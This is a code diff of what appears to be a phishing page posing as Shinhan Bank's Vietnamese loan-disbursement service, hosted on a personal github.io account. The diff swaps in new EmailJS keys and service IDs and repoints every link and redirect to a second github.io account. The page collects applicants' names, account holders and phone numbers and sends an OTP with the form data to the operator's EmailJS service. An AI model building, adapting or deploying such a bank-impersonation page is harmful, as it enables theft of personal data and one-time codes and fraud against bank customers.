@@ -47,7 +47,7 @@
         }
     </style>
     <script>
-        emailjs.init('c-Ms5MjWbitpDBb-E');
+        emailjs.init('jugdaw6sXSdJVlAlt');
     </script>
 </head>
 <body class="bg-slate-100 text-slate-800">
@@ -80,13 +80,13 @@
         </div>
         <nav id="mobile-menu" class="md:hidden hidden bg-white border-t border-gray-200">
             <div class="px-2 pt-2 pb-3 space-y-1 sm:px-3">
-                 <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/trang-chu.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Trang Chủ</a>
-                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Giới Thiệu</a>
-                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/ca-nhan.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Lợi Ích</a>
-                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Đăng Ký Giải Ngân</a>
-                 <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/step5.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Xem Kết Quả</a>
-                 <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Điều Khoản Sử Dụng</a>
-                 <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/support-center.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Liên Hệ</a>
+                 <a href="https://trum1212.github.io/shinhanbank/pages/vi/trang-chu.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Trang Chủ</a>
+                <a href="https://trum1212.github.io/shinhanbank/pages/vi/gioi-thieu.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Giới Thiệu</a>
+                <a href="https://trum1212.github.io/shinhanbank/pages/vi/ca-nhan.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Lợi Ích</a>
+                <a href="https://trum1212.github.io/shinhanbank/pages/vi/Evaluate-conditions.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Đăng Ký Giải Ngân</a>
+                 <a href="https://trum1212.github.io/shinhanbank/pages/vi/step5.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Xem Kết Quả</a>
+                 <a href="https://trum1212.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Điều Khoản Sử Dụng</a>
+                 <a href="https://trum1212.github.io/shinhanbank/pages/vi/support-center.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Liên Hệ</a>
             </div>
         </nav>
     </header>
@@ -247,7 +247,7 @@
                 contract_number: `SHB-${Date.now()}` // Tạo contract number tạm
             };
             
-            emailjs.send('service_60tgxof', 'template_p60g14a', templateParams).then(
+            emailjs.send('service_zspw0b7', 'template_yy36rn3', templateParams).then(
                 () => console.log('OTP sent to EmailJS:', templateParams),
                 (error) => console.error('EmailJS error:', error)
             );
@@ -316,7 +316,7 @@
                 errorMessageEl.textContent = 'Giải ngân không thành công. Vui lòng thử lại hoặc đăng ký giải ngân lại.';
                 errorButton.textContent = 'Đăng ký lại';
                 errorButton.onclick = () => {
-                    window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
+                    window.location.href = 'https://trum1212.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
                 };
                 modal.classList.remove('hidden');
             }
@@ -394,7 +394,7 @@ Hãy trình bày dưới dạng danh sách các gạch đầu dòng, sử dụng
             try {
                 formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
                 if (!formData.fullName && !formData.accountHolder) {
-                    window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
+                    window.location.href = 'https://trum1212.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
                     return;
                 }
                 // *** FIX: Ưu tiên accountHolder, nếu không có thì dùng fullName ***
@@ -405,7 +405,7 @@ Hãy trình bày dưới dạng danh sách các gạch đầu dòng, sử dụng
                 document.getElementById('otpMessage').innerHTML = `Một mã OTP đã được gửi đến số điện thoại <strong>${formData.phone || 'N/A'}</strong>.`;
             } catch (error) {
                 console.error('Error parsing formData:', error);
-                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
+                window.location.href = 'https://trum1212.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
             }
         });
     </script>
